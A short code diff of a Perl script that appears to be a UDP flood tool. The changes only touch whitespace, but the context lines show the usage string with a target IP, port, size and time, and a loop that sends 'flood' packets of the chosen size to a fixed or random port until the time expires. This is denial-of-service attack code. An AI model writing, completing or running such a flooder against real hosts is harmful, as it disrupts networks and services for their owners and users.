@@ -14,18 +14,14 @@
 #    License for the specific language governing permissions and limitations
 #    under the License.
 
-
 use Socket;
 use strict;
-
 
 if ($#ARGV != 3) {
   print "\n\t\t\t***Command must recieve four arguements***\n";
   print "perl uam 69.69.69.69 0 65500 0\n";
   exit(1);
 }
-
-
 
 my ($ip,$port,$size,$time) = @ARGV;
 my ($iaddr,$endtime,$psize,$pport);
@@ -44,3 +40,4 @@ for (;time() <= $endtime;) {
   $pport = $port ? $port : int(rand(65500))+1;
 
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 
+  
